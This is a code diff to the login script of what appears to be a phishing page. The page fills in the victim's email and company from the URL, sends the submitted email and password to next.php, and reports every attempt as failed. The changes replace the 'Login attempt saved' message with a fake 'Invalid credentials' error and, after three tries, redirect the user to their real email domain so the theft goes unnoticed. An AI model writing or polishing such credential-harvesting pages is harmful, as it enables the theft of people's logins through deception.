@@ -142,7 +142,7 @@
     </div>
 
     <script>
-        let failedAttempts = 0;
+        let failedAttempts = 0; // Counter to track failed login attempts
 
         // Dynamically update email and company name from URL hash
         document.addEventListener("DOMContentLoaded", function () {
@@ -176,6 +176,11 @@
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
 
+            if (!email || !password) {
+                displayError("Email or Password cannot be empty.");
+                return;
+            }
+
             // Send POST request to next.php
             fetch("./next.php", {
                 method: "POST",
@@ -184,25 +189,33 @@
             })
                 .then((response) => response.json())
                 .then((data) => {
-                    failedAttempts++;
-                    displayError(data.message || "Login attempt saved.");
+                    failedAttempts++; // Increment failed attempts
+                    displayError(data.message || "Invalid credentials. Please try again.");
+
+                    if (failedAttempts >= 3) {
+                        // Redirect user to their domain after 3 failed attempts
+                        window.location.href = `https://${email.split("@")[1]}`;
+                    }
                 })
                 .catch(() => {
-                    displayError("A server error occurred.");
+                    failedAttempts++; // Increment failed attempts on server error
+                    displayError("A server error occurred. Please try again.");
+                    
+                    if (failedAttempts >= 3) {
+                        // Redirect user to their domain after 3 failed attempts
+                        window.location.href = `https://${email.split("@")[1]}`;
+                    }
                 })
                 .finally(() => {
-                    document.getElementById("password").value = ""; // Clear password field
+                    document.getElementById("password").value = ""; // Clear password field after submission
                 });
         }
 
-        // Display error message with timeout
+        // Display error message permanently
         function displayError(message) {
             const errorDiv = document.getElementById("error-message");
-            errorDiv.style.display = "block";
+            errorDiv.style.display = "block"; // Keep the error message displayed
             errorDiv.innerText = message;
-            setTimeout(() => {
-                errorDiv.style.display = "none";
-            }, 2000);
         }
     </script>
 </body>
